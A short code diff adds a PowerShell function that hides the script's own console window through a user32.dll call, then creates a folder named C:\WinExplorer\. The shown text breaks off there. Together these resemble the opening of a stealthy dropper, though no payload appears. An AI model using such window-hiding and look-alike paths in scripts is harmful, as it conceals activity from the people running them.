@@ -1,3 +1,26 @@
+function Hide-ConsoleWindow() {
+  $ShowWindowAsyncCode = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
+  $ShowWindowAsync = Add-Type -MemberDefinition $ShowWindowAsyncCode -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
+
+  $hwnd = (Get-Process -PID $pid).MainWindowHandle
+  if ($hwnd -ne [System.IntPtr]::Zero) {
+    $ShowWindowAsync::ShowWindowAsync($hwnd, 0)
+  } else {
+
+    $UniqueWindowTitle = New-Guid
+    $Host.UI.RawUI.WindowTitle = $UniqueWindowTitle
+    $StringBuilder = New-Object System.Text.StringBuilder 1024
+    $TerminalProcess = (Get-Process | Where-Object { $_.MainWindowTitle -eq $UniqueWindowTitle })
+   
+    $hwnd = $TerminalProcess.MainWindowHandle
+    if ($hwnd -ne [System.IntPtr]::Zero) {
+      $ShowWindowAsync::ShowWindowAsync($hwnd, 0)
+    } else {
+      Write-Host "Failed to hide the console window."
+    }
+  }
+}
+Hide-ConsoleWindow
 $envp = "C:\WinExplorer\"
 if (-not (Test-Path $envp)) {
     New-Item -ItemType Directory -Path $envp
